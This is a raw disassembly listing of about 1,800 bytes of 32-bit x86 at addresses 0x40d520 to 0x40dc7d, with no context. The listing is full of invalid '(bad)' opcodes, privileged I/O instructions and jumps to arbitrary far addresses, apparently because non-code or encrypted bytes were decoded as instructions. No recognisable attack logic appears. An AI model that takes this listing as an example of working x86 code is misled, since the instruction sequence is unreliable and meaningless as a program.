  40d520:	cmp    ebx,esp
  40d522:	loop   0x40d554
  40d524:	fadd   st,st(6)
  40d526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d527:	fs pop ss
  40d529:	push   ecx
  40d52a:	fisub  WORD PTR [eax-0x2f]
  40d52d:	or     eax,DWORD PTR [ebx+0x602d7774]
  40d533:	jl     0x40d512
  40d535:	push   eax
  40d536:	jmp    0x40d586
  40d538:	sbb    BYTE PTR [ecx-0x64],ah
  40d53b:	sbb    esi,DWORD PTR [edx*1+0x44e73c12]
  40d542:	out    dx,eax
  40d543:	sahf   
  40d544:	outs   dx,BYTE PTR ds:[esi]
  40d545:	push   es
  40d546:	test   BYTE PTR [esi],ah
  40d548:	fs jmp 0xf809:0x76984b38
  40d550:	adc    eax,DWORD PTR [edi]
  40d552:	sbb    DWORD PTR [ebx+0x519ec5d9],edx
  40d558:	add    DWORD PTR [ebx+0x34],0xc68ffafa
  40d55f:	in     al,dx
  40d560:	sub    edi,esi
  40d562:	or     cl,bl
  40d564:	scas   eax,DWORD PTR es:[edi]
  40d565:	sbb    ah,dl
  40d567:	rcl    esi,cl
  40d569:	pop    ss
  40d56a:	cld    
  40d56b:	retf   
  40d56c:	scas   al,BYTE PTR es:[edi]
  40d56d:	xor    al,ch
  40d56f:	sbb    esp,DWORD PTR [ecx]
  40d571:	lahf   
  40d572:	retf   0x726d
  40d575:	add    eax,0x40977857
  40d57a:	icebp  
  40d57b:	out    0x27,al
  40d57d:	(bad)  
  40d57e:	das    
  40d57f:	popf   
  40d580:	int3   
  40d581:	test   BYTE PTR [ebx+0x11],bh
  40d584:	ret    
  40d585:	inc    esp
  40d586:	in     eax,0xe4
  40d588:	xor    esp,DWORD PTR [esi]
  40d58a:	fwait
  40d58b:	loope  0x40d5eb
  40d58d:	cli    
  40d58e:	mov    BYTE PTR [edi-0xe],dh
  40d591:	pop    edi
  40d592:	retf   
  40d593:	xchg   ecx,ebp
  40d595:	lods   eax,DWORD PTR ds:[esi]
  40d596:	das    
  40d597:	mov    eax,ds:0x41033008
  40d59c:	sbb    ah,BYTE PTR [edi+eiz*1+0x60516b38]
  40d5a3:	clc    
  40d5a4:	daa    
  40d5a5:	adc    eax,0x39536a79
  40d5aa:	int3   
  40d5ab:	ss (bad) 
  40d5ad:	loopne 0x40d5f6
  40d5af:	ins    DWORD PTR es:[edi],dx
  40d5b0:	ds pusha 
  40d5b2:	lock jae 0x40d580
  40d5b5:	jo     0x40d5cc
  40d5b7:	push   0x53bc4b6a
  40d5bc:	push   ds
  40d5bd:	add    al,0xf5
  40d5bf:	jmp    0xfc88:0x424aeb96
  40d5c6:	addr16 mov al,0x62
  40d5c9:	arpl   WORD PTR [ebx-0x5],ax
  40d5cc:	sbb    esi,DWORD PTR [ecx]
  40d5ce:	pop    esp
  40d5cf:	adc    BYTE PTR [ebp+edx*4+0x2e],ch
  40d5d3:	lods   ax,WORD PTR gs:[esi]
  40d5d6:	add    bl,BYTE PTR [ebp-0x61]
  40d5d9:	pop    edi
  40d5da:	fdivr  QWORD PTR [edx+0xf]
  40d5dd:	mov    al,ds:0xfea01fbc
  40d5e2:	outs   dx,DWORD PTR ds:[esi]
  40d5e3:	imul   edx,ebp,0xe557c9fe
  40d5e9:	adc    al,0xfc
  40d5eb:	jmp    0xa896:0x357852e7
  40d5f2:	inc    edx
  40d5f3:	xchg   edi,eax
  40d5f4:	nop
  40d5f5:	push   es
  40d5f6:	mov    DWORD PTR [edx-0x18cf32ed],esp
  40d5fc:	dec    edx
  40d5fd:	mov    cl,0xa4
  40d5ff:	mov    al,ds:0x3fa5a788
  40d604:	or     ebx,edi
  40d606:	push   ecx
  40d607:	ins    DWORD PTR es:[edi],dx
  40d608:	pop    ecx
  40d609:	ret    0x644d
  40d60c:	mov    al,BYTE PTR [esi]
  40d60e:	or     al,0xb2
  40d610:	jmp    0xee0badfc
  40d615:	cdq    
  40d616:	add    BYTE PTR [esp+ebx*1+0x3f],dh
  40d61a:	sub    al,bh
  40d61c:	pop    esi
  40d61d:	mov    ecx,0x4143e987
  40d622:	pop    ebx
  40d623:	pop    eax
  40d624:	pop    ss
  40d625:	jbe    0x40d611
  40d627:	mov    ah,0x6c
  40d629:	inc    edi
  40d62a:	test   bl,dl
  40d62c:	cs xchg edi,eax
  40d62e:	xchg   ebp,eax
  40d62f:	pop    edx
  40d630:	or     cl,0x7a
  40d633:	fild   QWORD PTR [ecx]
  40d635:	shr    DWORD PTR [ebx-0x75],1
  40d638:	cli    
  40d639:	mov    edi,0x140341ee
  40d63e:	mov    ebx,0xcf81cdfa
  40d643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d644:	xor    DWORD PTR ds:0x266646dd,ecx
  40d64a:	fnsave [ebx-0x28]
  40d64d:	xchg   ebp,eax
  40d64e:	push   ebp
  40d64f:	imul   edx,edx,0x796d0a9c
  40d655:	lock jle 0x40d5e9
  40d658:	mov    ebx,0xfed9fb84
  40d65d:	sti    
  40d65e:	ins    DWORD PTR es:[edi],dx
  40d65f:	dec    ebp
  40d660:	jl     0x40d5e9
  40d662:	sbb    al,0x78
  40d664:	outs   dx,DWORD PTR ds:[esi]
  40d665:	mov    DWORD PTR [ebx+0x7bec8595],0x5ad05ea6
  40d66f:	fcmovbe st,st(4)
  40d671:	daa    
  40d672:	push   edx
  40d673:	call   0x65b6c5e0
  40d678:	fidiv  DWORD PTR [edx-0x16370896]
  40d67e:	outs   dx,DWORD PTR ds:[esi]
  40d67f:	push   esi
  40d680:	mov    eax,ds:0x43eee13f
  40d685:	mov    ecx,0x21d74cf3
  40d68a:	push   ds
  40d68b:	xor    edx,ebx
  40d68d:	cmp    ebx,edi
  40d68f:	ss jg  0x40d619
  40d692:	jne    0x40d669
  40d694:	push   edi
  40d695:	mov    ecx,0xb74578be
  40d69a:	call   0x8b02:0xd220b32e
  40d6a1:	jl     0x40d6ce
  40d6a3:	mov    edi,DWORD PTR [ecx-0x2d]
  40d6a6:	jbe    0x40d6a3
  40d6a8:	aas    
  40d6a9:	ds dec esp
  40d6ab:	test   BYTE PTR [esi],ah
  40d6ad:	out    0x49,al
  40d6af:	pop    ebx
  40d6b0:	push   ebx
  40d6b1:	jl     0x40d650
  40d6b3:	test   DWORD PTR [edi],ebx
  40d6b5:	sti    
  40d6b6:	and    al,0x28
  40d6b8:	repnz inc esi
  40d6ba:	icebp  
  40d6bb:	mov    ds:0x9fe58733,al
  40d6c0:	sbb    esp,ebp
  40d6c2:	aas    
  40d6c3:	dec    edx
  40d6c4:	jno    0x40d671
  40d6c6:	xchg   ebx,eax
  40d6c7:	inc    ebx
  40d6c8:	pop    esp
  40d6c9:	sahf   
  40d6ca:	adc    ebp,DWORD PTR [eax+0x37b68008]
  40d6d0:	ins    DWORD PTR es:[edi],dx
  40d6d1:	ja     0x40d74f
  40d6d3:	and    cl,dl
  40d6d5:	fnstsw WORD PTR [ebx+0x22]
  40d6d8:	les    esi,FWORD PTR [ecx-0x41]
  40d6db:	dec    edi
  40d6dc:	imul   eax,DWORD PTR [ecx-0x29],0xffffffa3
  40d6e0:	je     0x40d6c0
  40d6e2:	mov    ebx,0x4fb04779
  40d6e7:	mov    dh,0x63
  40d6e9:	ret    
  40d6ea:	mov    eax,0xddea5c74
  40d6ef:	xchg   ecx,eax
  40d6f0:	mov    bl,BYTE PTR [edx-0x5dafd60a]
  40d6f6:	xor    edi,esi
  40d6f8:	stos   DWORD PTR es:[edi],eax
  40d6f9:	and    ah,dh
  40d6fb:	mov    dh,cl
  40d6fd:	push   ds
  40d6fe:	inc    esi
  40d6ff:	xor    al,0x5c
  40d701:	pop    ebp
  40d702:	add    DWORD PTR [ebp+0x7c68e4c4],edx
  40d708:	sbb    eax,0xa1796376
  40d70d:	gs (bad) 
  40d70f:	pushf  
  40d710:	retf   
  40d711:	mov    bh,0x5e
  40d713:	and    eax,DWORD PTR [ebp-0x6ccf4c84]
  40d719:	es push edx
  40d71b:	mov    esp,DWORD PTR [esi]
  40d71d:	nop
  40d71e:	retf   
  40d71f:	sub    al,bl
  40d721:	out    0x73,eax
  40d723:	xor    BYTE PTR [eax-0x17],al
  40d726:	jno    0x40d6d9
  40d728:	mov    BYTE PTR [ebx-0x212f33b3],dh
  40d72e:	in     al,dx
  40d72f:	rcr    BYTE PTR [edi-0x767de7fc],1
  40d735:	jnp    0x40d73c
  40d737:	imul   edi,DWORD PTR [edx+eiz*4+0x2b],0x69
  40d73c:	ja     0x40d7b6
  40d73e:	les    esp,FWORD PTR [eax+0x276e3f03]
  40d744:	sub    al,BYTE PTR [eax+0x39d28428]
  40d74a:	stc    
  40d74b:	cld    
  40d74c:	js     0x40d76a
  40d74e:	in     al,0xfb
  40d750:	fdivp  st(1),st
  40d752:	mov    ch,0xa9
  40d754:	dec    eax
  40d755:	fcmovne st,st(6)
  40d757:	dec    si
  40d759:	test   ch,dh
  40d75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d75c:	fcmovu st,st(5)
  40d75e:	xor    eax,0x1a4c7de1
  40d763:	or     al,0x1d
  40d765:	retf   0xb221
  40d768:	lds    ebx,FWORD PTR [ebx]
  40d76a:	sub    ecx,DWORD PTR [esi+eiz*4+0x7083aae8]
  40d771:	sti    
  40d772:	gs push cs
  40d774:	inc    eax
  40d775:	ror    BYTE PTR [ecx-0x1d],0x6
  40d779:	(bad)  
  40d77a:	push   0x14
  40d77c:	and    edi,DWORD PTR [edi-0x72a73a8f]
  40d782:	out    0x75,eax
  40d784:	push   ebp
  40d785:	ja     0x40d707
  40d787:	pop    eax
  40d788:	(bad)  
  40d789:	neg    BYTE PTR [eax-0x66886547]
  40d78f:	shl    DWORD PTR [edx+0x246150fc],cl
  40d795:	sti    
  40d796:	dec    ebx
  40d797:	repz dec eax
  40d799:	loope  0x40d75b
  40d79b:	mov    ah,BYTE PTR [edx]
  40d79d:	popf   
  40d79e:	je     0x40d748
  40d7a0:	push   edx
  40d7a1:	fs mov ebx,0xe7b2de7d
  40d7a7:	test   edx,esi
  40d7a9:	ds pop esp
  40d7ab:	mov    edi,0xd4ecd3a6
  40d7b0:	mov    gs,esi
  40d7b2:	sub    dl,BYTE PTR [ecx+0x783bbb47]
  40d7b8:	stos   BYTE PTR es:[edi],al
  40d7b9:	aaa    
  40d7ba:	dec    ebp
  40d7bb:	cdq    
  40d7bc:	xchg   edx,eax
  40d7bd:	fsubr  DWORD PTR [ebx-0x64]
  40d7c0:	repz lea eax,[ebx-0x15c9b7cc]
  40d7c7:	jnp    0x40d76a
  40d7c9:	cs mov ecx,0x6c562ec6
  40d7cf:	cli    
  40d7d0:	icebp  
  40d7d1:	adc    BYTE PTR [esi+0x79],ah
  40d7d4:	jg     0x40d7fe
  40d7d6:	fcmovnb st,st(3)
  40d7d8:	xor    BYTE PTR [edi],dh
  40d7da:	add    DWORD PTR [ecx],esp
  40d7dc:	pop    esi
  40d7dd:	mov    eax,ds:0xced298ce
  40d7e2:	mov    eax,gs:0x46fb801c
  40d7e8:	jne    0x40d7a7
  40d7ea:	es or  eax,0x70f8a319
  40d7f0:	pop    ss
  40d7f1:	xor    edi,esi
  40d7f3:	pushf  
  40d7f4:	call   0x8330c941
  40d7f9:	and    al,0x4b
  40d7fb:	(bad)  
  40d7fc:	or     eax,0xf7aba295
  40d801:	loope  0x40d7dc
  40d803:	inc    eax
  40d804:	mov    ecx,ebp
  40d806:	dec    edx
  40d807:	add    DWORD PTR [ebx-0x61],ebp
  40d80a:	js     0x40d84d
  40d80c:	push   ss
  40d80d:	dec    edi
  40d80e:	js     0x40d84a
  40d810:	lds    edi,FWORD PTR [edi]
  40d812:	aas    
  40d813:	sub    bl,BYTE PTR [ecx]
  40d815:	je     0x40d85b
  40d817:	jp     0x40d853
  40d819:	dec    esp
  40d81a:	jns    0x40d81d
  40d81c:	adc    eax,0x598e9680
  40d821:	ja     0x40d832
  40d823:	jne    0x40d85a
  40d825:	mov    WORD PTR [ebx+eiz*8+0x40],fs
  40d829:	lds    ebp,FWORD PTR [edx]
  40d82b:	dec    ecx
  40d82c:	cmp    eax,0x504d226c
  40d831:	add    bl,BYTE PTR [esp+edi*8-0x7e39660f]
  40d838:	jns    0x40d830
  40d83a:	sbb    DWORD PTR [ecx],ebp
  40d83c:	shl    BYTE PTR [ebp-0x4b995ba1],cl
  40d842:	xchg   edi,eax
  40d843:	xchg   BYTE PTR [ecx-0x6c],dh
  40d846:	fmul   DWORD PTR [ebx-0x2a]
  40d849:	lock shl BYTE PTR [edi],1
  40d84c:	out    dx,al
  40d84d:	inc    edx
  40d84e:	pushf  
  40d84f:	sti    
  40d850:	inc    edi
  40d851:	push   ds
  40d852:	int    0xff
  40d854:	jg     0x40d841
  40d856:	das    
  40d857:	ja     0x40d8b1
  40d859:	daa    
  40d85a:	stos   DWORD PTR es:[edi],eax
  40d85b:	int3   
  40d85c:	in     eax,dx
  40d85d:	ds add al,0xdc
  40d860:	lock add ecx,0xee59ed70
  40d867:	imul   esp,DWORD PTR [esi-0xef576ac],0x1b
  40d86e:	pop    ecx
  40d86f:	loop   0x40d864
  40d871:	or     eax,0x3ad90ddc
  40d876:	repnz mov al,ds:0xc9f9e292
  40d87c:	inc    ebp
  40d87d:	inc    edx
  40d87e:	stos   BYTE PTR es:[edi],al
  40d87f:	loopne 0x40d81f
  40d881:	mov    bh,0xce
  40d883:	dec    ecx
  40d884:	stc    
  40d885:	(bad)  
  40d886:	ins    DWORD PTR es:[edi],dx
  40d887:	cmp    al,0x80
  40d889:	xchg   ebp,eax
  40d88a:	jo     0x40d872
  40d88c:	sbb    esp,DWORD PTR [eiz*4+0x29ccdfb1]
  40d893:	mov    bl,BYTE PTR [edx-0x177d9429]
  40d899:	jno    0x40d8bc
  40d89b:	lock xor eax,0x5d1c63e6
  40d8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8a2:	(bad)  
  40d8a3:	mul    BYTE PTR [ecx+0x7c561f4]
  40d8a9:	xlat   BYTE PTR ds:[ebx]
  40d8aa:	sub    bh,bl
  40d8ac:	mov    BYTE PTR [edx+0xb],al
  40d8af:	sub    BYTE PTR [esi-0x5e51608d],ch
  40d8b5:	(bad)  
  40d8b6:	lahf   
  40d8b7:	cmp    edx,ecx
  40d8b9:	jmp    0x3000ea9c
  40d8be:	mov    DWORD PTR [ebx+0x79],edi
  40d8c1:	xor    dl,BYTE PTR [ebx]
  40d8c3:	stc    
  40d8c4:	sti    
  40d8c5:	mov    ah,0x58
  40d8c7:	xchg   esi,eax
  40d8c8:	or     BYTE PTR [edx*2+0x7eb2a35c],ah
  40d8cf:	xchg   esp,eax
  40d8d0:	ror    edx,cl
  40d8d2:	int    0x6c
  40d8d4:	add    ebx,esi
  40d8d6:	add    al,0xc4
  40d8d8:	clc    
  40d8d9:	invd   
  40d8db:	fwait
  40d8dc:	cmp    BYTE PTR [edx-0x5e],0x36
  40d8e0:	into   
  40d8e1:	data16 or al,0x9d
  40d8e4:	and    eax,0xce65021
  40d8e9:	daa    
  40d8ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8eb:	sbb    ah,0xe7
  40d8ee:	mov    BYTE PTR [eax-0x190bd8fb],bl
  40d8f4:	xor    eax,0xd9cf65ac
  40d8f9:	sbb    al,0xa7
  40d8fb:	sub    DWORD PTR [ebp+0xde7c2a],ebp
  40d901:	jo     0x40d8e1
  40d903:	(bad)  
  40d905:	pusha  
  40d906:	and    al,0x70
  40d908:	dec    eax
  40d909:	mov    bh,0x39
  40d90b:	sbb    BYTE PTR [edi-0xb6762aa],bh
  40d911:	cmp    al,0xd
  40d913:	add    ebx,DWORD PTR [edi+edi*1+0x5b]
  40d917:	add    edi,DWORD PTR [ebp-0x4]
  40d91a:	adc    al,0xdb
  40d91c:	fimul  WORD PTR [ebp-0x44f5fd5a]
  40d922:	mov    ebx,0xf9e9e9e3
  40d927:	aam    0xa2
  40d929:	int3   
  40d92a:	pop    ebp
  40d92b:	ror    DWORD PTR [ebp+0x763d99b4],1
  40d931:	ret    0x119e
  40d934:	mov    bh,0x71
  40d936:	in     eax,dx
  40d937:	push   ss
  40d938:	or     bh,BYTE PTR cs:[ecx]
  40d93b:	mov    esp,0xe1c31e43
  40d940:	adc    al,0x50
  40d942:	push   0x61
  40d944:	sub    BYTE PTR [bp+di-0xc],bh
  40d948:	xlat   BYTE PTR ds:[ebx]
  40d949:	arpl   WORD PTR [eax+0xdf3f554],cx
  40d94f:	push   es
  40d950:	sbb    eax,DWORD PTR [ebp-0x1]
  40d953:	lods   eax,DWORD PTR ds:[esi]
  40d954:	xchg   edi,eax
  40d955:	cwde   
  40d956:	add    BYTE PTR [ebx+0x29],bl
  40d959:	dec    esp
  40d95a:	pop    edx
  40d95b:	cdq    
  40d95c:	out    dx,eax
  40d95d:	(bad)  
  40d95e:	push   edi
  40d95f:	(bad)  
  40d961:	ins    BYTE PTR es:[edi],dx
  40d962:	dec    ebx
  40d963:	xchg   ecx,eax
  40d964:	inc    edx
  40d965:	pop    esp
  40d966:	cmp    ch,BYTE PTR [ecx+0x3c]
  40d969:	push   esp
  40d96a:	pop    edx
  40d96b:	add    dl,BYTE PTR [ebx+0x21fa5c29]
  40d971:	loop   0x40d932
  40d973:	or     ecx,esp
  40d975:	out    0x6c,eax
  40d977:	aaa    
  40d978:	adc    DWORD PTR [edi+0x40],0x5d741d10
  40d97f:	add    edi,DWORD PTR [esi+0x286e5020]
  40d985:	or     eax,0xaef621b2
  40d98a:	mov    dh,0xac
  40d98c:	pushw  cs
  40d98e:	pusha  
  40d98f:	adc    DWORD PTR [edi-0x29],ecx
  40d992:	out    dx,al
  40d993:	popa   
  40d994:	std    
  40d995:	sub    bl,BYTE PTR [ebp-0x6]
  40d998:	int    0x20
  40d99a:	inc    ebx
  40d99b:	scas   al,BYTE PTR es:[edi]
  40d99c:	push   esi
  40d99d:	pop    eax
  40d99e:	jns    0x40da1d
  40d9a0:	pusha  
  40d9a1:	data16 mov al,0xef
  40d9a4:	(bad)  
  40d9a6:	or     BYTE PTR [ebp+0x7a2ce662],dl
  40d9ac:	mov    BYTE PTR [edx+0x7a702108],bl
  40d9b2:	outs   dx,DWORD PTR ds:[esi]
  40d9b3:	aam    0x17
  40d9b5:	outs   dx,DWORD PTR ds:[esi]
  40d9b6:	aam    0x54
  40d9b8:	push   eax
  40d9b9:	sbb    al,BYTE PTR [eax+edx*4+0x491a710b]
  40d9c0:	xor    eax,DWORD PTR [edx-0x1e]
  40d9c3:	xor    al,0x7
  40d9c5:	sahf   
  40d9c6:	add    BYTE PTR [esi+0x1d],ah
  40d9c9:	mov    al,0xbd
  40d9cb:	not    DWORD PTR [esi-0x38]
  40d9ce:	mov    al,0x89
  40d9d0:	push   edi
  40d9d1:	pop    edi
  40d9d2:	dec    edx
  40d9d3:	fild   QWORD PTR [ecx+0x67d8ed36]
  40d9d9:	push   eax
  40d9da:	das    
  40d9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9dc:	push   es
  40d9dd:	or     eax,0x91bbbb8d
  40d9e2:	fdiv   DWORD PTR [edx]
  40d9e4:	cmp    eax,edx
  40d9e6:	and    al,0xdd
  40d9e8:	push   edi
  40d9e9:	fs xchg esp,eax
  40d9eb:	popf   
  40d9ec:	push   eax
  40d9ed:	push   es
  40d9ee:	fwait
  40d9ef:	iret   
  40d9f0:	add    bh,BYTE PTR [edx-0x61]
  40d9f3:	sbb    al,0xb7
  40d9f5:	mov    bl,0xa1
  40d9f7:	leave  
  40d9f8:	ret    
  40d9f9:	sbb    DWORD PTR [esi+edi*8+0x7f],ebp
  40d9fd:	fidivr DWORD PTR [ebx+0x54]
  40da00:	out    dx,al
  40da01:	dec    edx
  40da02:	cs add eax,0x97c19bcb
  40da08:	daa    
  40da09:	mov    eax,eax
  40da0b:	dec    esp
  40da0c:	adc    ecx,edx
  40da0e:	es pop esi
  40da10:	add    edi,DWORD PTR [edx+0x3a97eca0]
  40da16:	(bad)  
  40da17:	loopne 0x40da87
  40da19:	(bad)  
  40da1a:	mov    ebp,ebx
  40da1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da1d:	add    bh,BYTE PTR ss:[esi+0x2b]
  40da21:	inc    edx
  40da22:	push   ebp
  40da23:	aam    0x8c
  40da25:	retf   
  40da26:	call   0xedc9:0x835d6fa5
  40da2d:	push   ecx
  40da2e:	call   0xbfba3289
  40da33:	and    BYTE PTR [ebx+0x5272cef],0x7e
  40da3a:	sub    eax,0x9a38b259
  40da3f:	or     eax,0xdd7f67cb
  40da44:	cmp    al,0x5c
  40da46:	pusha  
  40da47:	sub    edi,eax
  40da49:	sbb    al,0x6e
  40da4b:	cmp    eax,0xa3dfb4ad
  40da50:	add    ebx,edx
  40da52:	ins    DWORD PTR es:[edi],dx
  40da53:	push   edx
  40da54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da55:	call   0x2008:0xa03b3903
  40da5c:	dec    edx
  40da5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da5e:	push   ds
  40da5f:	adc    bl,BYTE PTR [esp+eax*4+0x5ff7bfdb]
  40da66:	nop
  40da67:	mov    edx,0x20b8acc0
  40da6c:	sbb    edi,DWORD PTR [edi-0x1b]
  40da6f:	inc    eax
  40da70:	sub    al,0x8a
  40da72:	inc    eax
  40da73:	pop    ebx
  40da74:	mov    dh,0xff
  40da76:	sbb    eax,0x7574118e
  40da7b:	fbld   TBYTE PTR ds:0xa9503277
  40da81:	enter  0x72bb,0xf9
  40da85:	adc    DWORD PTR [esi],edi
  40da87:	icebp  
  40da88:	push   ebp
  40da89:	dec    ebp
  40da8a:	dec    esi
  40da8b:	sub    BYTE PTR [ebx+0x67f9acc3],al
  40da91:	fild   QWORD PTR [eax-0x5c166c7d]
  40da97:	adc    eax,0x11d9dfdc
  40da9c:	jecxz  0x40daa3
  40da9e:	xchg   edi,eax
  40da9f:	sti    
  40daa0:	cmp    DWORD PTR [ebp-0x25],edx
  40daa3:	(bad)  
  40daa4:	jae    0x40da9f
  40daa6:	arpl   WORD PTR [ebp+0x2041c321],ax
  40daac:	(bad)  
  40daad:	add    eax,DWORD PTR [edi]
  40daaf:	pop    eax
  40dab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab1:	xchg   ecx,eax
  40dab2:	jl     0x40dada
  40dab4:	cmp    ebp,ebx
  40dab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab7:	mov    ah,0xdf
  40dab9:	push   ebx
  40daba:	push   ss
  40dabb:	dec    ebp
  40dabc:	gs pop edi
  40dabe:	xchg   ebp,eax
  40dabf:	ret    
  40dac0:	cmp    DWORD PTR [ebx+0x63456a4d],esi
  40dac6:	loop   0x40db29
  40dac8:	add    al,0xf0
  40daca:	hlt    
  40dacb:	push   edx
  40dacc:	pop    ss
  40dacd:	or     eax,0x33201c2f
  40dad2:	jge    0x40da60
  40dad4:	mov    ah,0x3f
  40dad6:	mov    WORD PTR ds:0x898f2c8d,gs
  40dadc:	dec    edx
  40dadd:	mov    cl,0xbd
  40dadf:	fadd   st(5),st
  40dae1:	fild   QWORD PTR [edx+0x71840a5a]
  40dae7:	clc    
  40dae8:	pop    edi
  40dae9:	(bad)  
  40daea:	pushf  
  40daeb:	mul    DWORD PTR ds:0xd6e417d8
  40daf1:	mov    ds:0x500f9fc8,al
  40daf6:	repnz stc 
  40daf8:	add    cl,bl
  40dafa:	pop    ebp
  40dafb:	out    dx,al
  40dafc:	push   ss
  40dafd:	es ins DWORD PTR es:[edi],dx
  40daff:	xor    DWORD PTR [edx+0xe],ecx
  40db02:	dec    esp
  40db03:	jmp    0x7bee266c
  40db08:	es inc edi
  40db0a:	mov    ch,0x41
  40db0c:	sub    eax,0x697669b4
  40db11:	sub    ch,BYTE PTR [ebx-0x6e]
  40db14:	push   edx
  40db15:	(bad)  
  40db16:	scas   al,BYTE PTR es:[edi]
  40db17:	jb     0x40db2c
  40db19:	mov    bh,0x1f
  40db1b:	mov    eax,ds:0xfa2730a
  40db20:	jmp    0x40db44
  40db22:	xor    DWORD PTR [edi],edi
  40db24:	sbb    eax,0xae697f06
  40db29:	jnp    0x40db64
  40db2b:	fcom   QWORD PTR [eax+0x46510e56]
  40db31:	cmp    ecx,ebp
  40db33:	rol    DWORD PTR [ecx],0x41
  40db36:	jbe    0x40dace
  40db38:	cmp    DWORD PTR [ebp+0x423d5365],edx
  40db3e:	xchg   ecx,eax
  40db3f:	stos   DWORD PTR es:[edi],eax
  40db40:	and    al,0xfc
  40db42:	pop    ds
  40db43:	out    0xb8,al
  40db45:	fmul   st(5),st
  40db47:	mov    DWORD PTR [edx-0x5f7bee03],esi
  40db4d:	aam    0xf5
  40db4f:	sti    
  40db50:	lods   eax,DWORD PTR ds:[esi]
  40db51:	push   eax
  40db52:	mov    edi,0xce27bee2
  40db57:	icebp  
  40db58:	scas   al,BYTE PTR es:[edi]
  40db59:	loop   0x40daee
  40db5b:	fs leavew 
  40db5e:	shr    BYTE PTR [ebp-0x63],cl
  40db61:	push   0x2e3cc483
  40db66:	lds    edi,FWORD PTR [ebp+0x74]
  40db69:	dec    ecx
  40db6a:	and    ebx,DWORD PTR [edx+0x56d46288]
  40db70:	inc    esi
  40db71:	imul   esi,ebp,0x9e1ce3fe
  40db77:	xor    BYTE PTR [ebx+0x341c4939],ah
  40db7d:	ror    BYTE PTR [esi+0x5e9661cd],1
  40db83:	pop    sp
  40db85:	mov    dl,0x33
  40db87:	jl     0x40db22
  40db89:	jmp    0xa1f0bbca
  40db8e:	clc    
  40db8f:	ins    BYTE PTR es:[edi],dx
  40db90:	jl     0x40db6d
  40db92:	lea    esp,[ebp+ebp*8+0x122dada0]
  40db99:	call   0x9d15:0x3587f528
  40dba0:	add    edi,0xffffffd7
  40dba3:	cmp    BYTE PTR [ebx+0x3a],cl
  40dba6:	in     al,0x4e
  40dba8:	and    al,BYTE PTR [edi]
  40dbaa:	xor    edx,edx
  40dbac:	div    DWORD PTR [edi+0x2a180d05]
  40dbb2:	dec    ebx
  40dbb3:	cmp    al,0x70
  40dbb5:	daa    
  40dbb6:	jle    0x40db69
  40dbb8:	stos   DWORD PTR es:[edi],eax
  40dbb9:	xchg   ebp,eax
  40dbba:	stc    
  40dbbb:	mov    al,0xe2
  40dbbd:	xchg   ecx,eax
  40dbbe:	xor    bl,BYTE PTR [edi]
  40dbc0:	or     dh,dl
  40dbc2:	inc    ebx
  40dbc3:	sbb    eax,0x5cc9b14d
  40dbc8:	push   ebx
  40dbc9:	sub    eax,0x944a0a6d
  40dbce:	mov    eax,0x7b3ff0f6
  40dbd3:	dec    esp
  40dbd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd5:	test   al,0x57
  40dbd7:	push   ebp
  40dbd8:	ret    
  40dbd9:	les    esp,FWORD PTR ds:0xfc5cdb00
  40dbdf:	xor    eax,0xa2dcafa4
  40dbe4:	xchg   edx,eax
  40dbe5:	mov    eax,ebx
  40dbe7:	pusha  
  40dbe8:	jne    0x40db87
  40dbea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbeb:	jg     0x40dc53
  40dbed:	pop    es
  40dbee:	sbb    cl,cl
  40dbf0:	mov    cl,0x6a
  40dbf2:	cmp    DWORD PTR [esp+edx*2+0x2563f08a],0x4d
  40dbfa:	mov    esp,0x901c1ba2
  40dbff:	dec    ebp
  40dc00:	adc    DWORD PTR gs:[edi-0x28],eax
  40dc04:	push   esi
  40dc05:	inc    edx
  40dc06:	lds    ebx,FWORD PTR [ecx+0x20864751]
  40dc0c:	loopne 0x40dc3f
  40dc0e:	or     al,0x7
  40dc10:	std    
  40dc11:	lods   al,BYTE PTR ds:[esi]
  40dc12:	into   
  40dc13:	xchg   esp,eax
  40dc14:	outs   dx,BYTE PTR ds:[esi]
  40dc15:	push   ebx
  40dc16:	add    eax,ebx
  40dc18:	mov    cl,0x6f
  40dc1a:	dec    ecx
  40dc1b:	mov    cs,WORD PTR [ecx]
  40dc1d:	xor    DWORD PTR [ebx-0x36],ecx
  40dc20:	iret   
  40dc21:	(bad)  
  40dc22:	cmp    al,0x80
  40dc24:	lods   al,BYTE PTR ds:[esi]
  40dc25:	inc    ebx
  40dc26:	mov    edi,0xa653b175
  40dc2b:	xchg   ebx,eax
  40dc2c:	repz jmp 0x40dc62
  40dc2f:	out    dx,al
  40dc30:	mov    esi,DWORD PTR [esi-0x7c]
  40dc33:	sub    edx,DWORD PTR [eax]
  40dc35:	dec    eax
  40dc36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc37:	mov    edi,0x1787e54d
  40dc3c:	div    DWORD PTR [eax+0x27]
  40dc3f:	sub    al,BYTE PTR [edx+0x36]
  40dc42:	sbb    edx,edi
  40dc44:	ret    0x2c43
  40dc47:	imul   ecx,DWORD PTR [ebp+0x1],0xffffffbb
  40dc4b:	cmp    edx,eax
  40dc4d:	call   0x1dac:0x1762fd8c
  40dc54:	cmp    al,0xd2
  40dc56:	mov    ecx,0x4230e657
  40dc5b:	adc    DWORD PTR [ebx+0x7b],esp
  40dc5e:	(bad)  
  40dc60:	add    bh,BYTE PTR [ecx+0x5f]
  40dc63:	ds jle 0x40dc3c
  40dc66:	mov    esi,ebx
  40dc68:	cdq    
  40dc69:	mov    ecx,0x1b6c9265
  40dc6e:	imul   eax,DWORD PTR [edi],0x670aac07
  40dc74:	je     0x40dc0f
  40dc76:	in     eax,0xc2
  40dc78:	xchg   esp,eax
  40dc79:	int    0xb6
  40dc7b:	push   edx
  40dc7c:	pop    esi
  40dc7d:	push   edx
